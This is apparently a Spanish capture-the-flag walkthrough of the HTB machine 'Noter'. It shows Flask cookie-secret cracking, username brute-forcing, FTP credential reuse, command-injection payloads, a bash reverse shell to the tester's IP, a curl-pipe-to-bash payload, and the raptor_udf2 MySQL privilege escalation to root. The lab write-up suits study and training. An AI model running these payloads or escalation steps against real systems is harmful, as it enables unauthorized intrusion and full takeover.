10.10.11.160 Noter
------------------

Puertos abiertos 21(ftp), 22(ssh) y 5000(http)

```console
└─$ whatweb http://10.10.11.160:5000http://10.10.11.160:5000 [200 OK] Bootstrap[3.3.7], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter],
```
----------------------

# Parte 1: Reconocimiento Web

Es una web de notas, como va por Python es muy probable que haya un STTI.

En el apartado /VIP dice que **No pueden dar membresias por un problema en el backend**

EN /edit_note me sale directamente la 3, como que hay dos notas antes si pongo 1 o 2 da error sql.

```console
└─$ curl -s http://10.10.11.160:5000/edit_note/1 --cookie "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
```

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.160:5000/FUZZ/
```
------------------------------

# Parte 2: Obtencion de un usaurio

La cookie ```eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM```
se decodifica en ```{"logged_in": true, "username": "cucuxii"}```,  esa es la tipica estrucutra de las 
cookies de flask.

```console
└─$ flask-unsign --unsign --wordlist '/usr/share/wordlists/rockyou.txt' --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiY3VjdXhpaXt7Nyo3fX0ifQ.Y1lb4g.TD5K_B9pe7Z0nyo3R8DA4PmwjRM' --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'cucuxii'}
b'secret123'
└─$ flask-unsign --sign  --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Y1llwA.mVo32E2J2WotjCks0t69am5TCV8
```
Cuando meto la cookie en la web me da error "Unauthorized" porque el usuario admin no existe.

### Fuzzing panel de login

Como pone "Invalid Crendentials" probe a fuzzear el nombre de usuario (ya que si pongo el mio, que existe, pone
"Invalid Login")

Me cree un sccript para hacer el fuzzing de usaurios:
```python3
#!/bin/python3
import requests

main_url = "http://10.10.11.160:5000/login"
intento = 0
file = open('/usr/share/seclists/Usernames/Names/names.txt','r')
for name in file.readlines():
    name = name.strip()
    data = {'username': name ,'password':'test'}
    req = requests.post(main_url, data)
    intento += 1
    print(f"{intento}:  {name}")
    if "Invalid credentials" not in req.text:
        break
```

Se paró en "blue".

Asi que toca crear su cookie:
```console
└─$ flask-unsign --sign  --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Y1lyDg.2Rw4NU_I1TDEs6KuZ-bvQ4DPBNU
```

Ahora estamos como blue, la nota 2 es esta (la 1 sigue dando server error)
```
* Delete the password note
* Ask the admin team to change the password
```

En notes se ve la 1
```
Hello, Thank you for choosing our premium service. Now you are capable of doing many more things with our 
application. All the information you are going to need are on the Email we sent you. By the way, now you can 
access our FTP service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.
(Additional information are included in the attachments we sent along the Email)
We all hope you enjoy our service. Thanks!
ftp_admin
```
--------------------------------

# Parte 3: Entrando en el servidor ftp

Parece que hay un usuario llamado ftp_admin, pero tenemos creds para ftp blue:blue@Noter!
```console
└─$ ftp 10.10.11.160
Name: blue
Password:
ftp> ls
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
ftp> prompt off 
Interactive mode off.
ftp> mget *
```

Obtenemos un pdf (policy.pdf) en el que hablan de consejos de seguirdad para la empresa respecto a contraseñas.
Llama la atención una sección:

- Las contraseñas por defecto que genera la aplicación están en el formato "nombre@Noter!"

Así que la de ftp_admin debería cumplir este requisito si no se ha cambiado ftp_admin:ftp_admin@Noter!

Nos conectamos por ftp con estas creds, y repetimos el proceso.
```console
└─$ ftp 10.10.11.160
Name: ftp_admin
Password:
ftp> ls
-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
ftp> prompt off 
Interactive mode off.
ftp> mget * 
```
Tenemos dos zips que parecen ser identicos. Cuando se descomprimen tienen la misma estrcutura de carpetas.
La manera que hay de ver la diferencia es con el comando diff
```console
└─$ diff version1 version2
diff '--color=auto' version1/app.py version2/app.py
17,18c17,18
< app.config['MYSQL_USER'] = 'root'
< app.config['MYSQL_PASSWORD'] = 'Nildogg36'
---
> app.config['MYSQL_USER'] = 'DB_user'
> app.config['MYSQL_PASSWORD'] = 'DB_password'
...
```
Conseguimos las creds -> root:Nildogg36
------------------------

# Parte 4: Analizando la aplicacion

Aparte de esto, la segunda versión el archivo app.py es mucho mas extenso.
Este archivo es el codigo fuente en flask de la aplicación. Buscaremos funciones peligrosas
```console
└─$ cat app.py | grep -IEn "exec|system|os|subprocess" | grep -vE "cur|Close" 
# Hemos exlcuido tanto cur (que son operaciones sql) como CLose que son mensajes "Close connection"
285:            subprocess.run(command, shell=True, executable="/bin/bash")
309:                    subprocess.run(command, shell=True, executable="/bin/bash")
```
Llaman la atencion esas dos lineas.
El codigo entero (parte vulnerable) seria tal que asi:
```python
@app.route('/export_note_local/<string:id>', methods=['GET'])
@is_logged_in
def export_note_local(id):
    if check_VIP(session['username']):
        cur = mysql.connection.cursor()
        result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username'
        if result > 0:
            note = cur.fetchone(); rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")
            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)

@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        url = request.form['url']
        status, error = parse_url(url)
        if (status is True) and (error is None):
            r = pyrequest.get(url,allow_redirects=True)
            rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")
```

Analizando el codigo tanto en /export_note_local como /export_note_remote se ejecuta el comando:
```md-to-pdf.js {nota}```

Al ser un comando ejecutado a nivel de sistema y tener nosotros el control de que nota queremos, podriamos hacer
un OS command inyection.

Pruebo con local  ```/export_note_local/2; ping -c 1 10.10.14.15``` y me da un internal server error.

Con remote tienes que poner tu la nota, Test:
```console
└─$ echo "Mariscos Recio" > note.md
└─$ sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.160 - - [27/Oct/2022 10:22:09] "GET /note.md HTTP/1.1" 200 -
```

----------------------

# Parte 5: obteniendo acceso

El codigo dice que:
```command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"```
Es decir dentro de $'' mete el contenido de la nota: ```md_to_pdf $'Mariscos Recio'``` 

El comando con inyeccion seria tal que: ```node md-to-pdf.js $';whoami'```
Teniendo que escapar del contexto de los ' -> ```node md-to-pdf.js $'';whoami; echo''```
Lo mismo con ping -> ```'; ping -c 1 10.10.14.15 ;echo' ```
Recibiendo:
└─$ sudo tcpdump -i tun0 icmp -n
10:37:37.601822 IP 10.10.11.160 > 10.10.14.15: ICMP echo request, id 2, seq 1, length 64
10:37:37.601854 IP 10.10.14.15 > 10.10.11.160: ICMP echo reply, id 2, seq 1, length 64

Tambien buscando la vuln por google te sale como poner el payload:
```console
└─$ cat note.md
---js\n((require("child_process")).execSync("ping -c 1 10.10.14.15"))\n---RCE
```
Obtenemos el mismo resultado.

Shell:
index.html
```bash
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```
nota:
```---js\n((require("child_process")).execSync("curl http://10.10.14.15:8000 | bash"))\n---RCE```

Con netcat en escucha por el puerto 443 tenemos la shell.
He importado mi script de enumeracion:
- Uusarios -> svc (nosotros) y root
- /tmp/puppeteer_dev_chrome_profile-mPQ3N6??
- Tiene abierto el mysql (3306) y por el puerto 39617 el node (para correr el md-to-js)
- Mysql corre por root -> critico

------------------------------

# Parte 6: Escalando a root

En la web [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library) hablan de esta situacion (root en mysql):

Se puede entrar ya que antes conseguumos las creds root:Nildogg36

Consiste en copiar este [código](https://www.exploit-db.com/exploits/1518), y compilarlo en el sistema vicitma.
```console
svc@noter:/tmp$ curl -O http://10.10.14.15:8000/raptor_udf2.c
svc@noter:/tmp$ gcc -g -c raptor_udf2.c
svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
svc@noter:/tmp$ mysql -u root -p
MariaDB [mysql]> create table foo(line blob);
MariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));
MariaDB [mysql]> show variables like '%plugin%';
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
MariaDB [mysql]> select do_system('chmod u+s /bin/bash');
```

Explicacion del exploit.
Como estamos usando mysql como root podemos acceder a rutas restringidas como */usr/lib* 
Crea una tabla en mysql (en realidad da igual donde) y le mete el */tmp/raptor_udf2.so*, luego esto lo selecciona
y lo mete en los plugins de mariadb, luego, ejecuta una función con este plugin (o sea como cargar una libreria
del python, no hay mucha diferencia).

Analizando el codigo fuente de la librería tiene una función que lo que hace es pasarle a system() argumentos.
System es una libería de C que permite ejecutar comandos en el sistema (y somos root, no lo olvidemos).

La manera de cimpilar esto es cargando las librerias junto al código (asi accede sin depender del contexto).













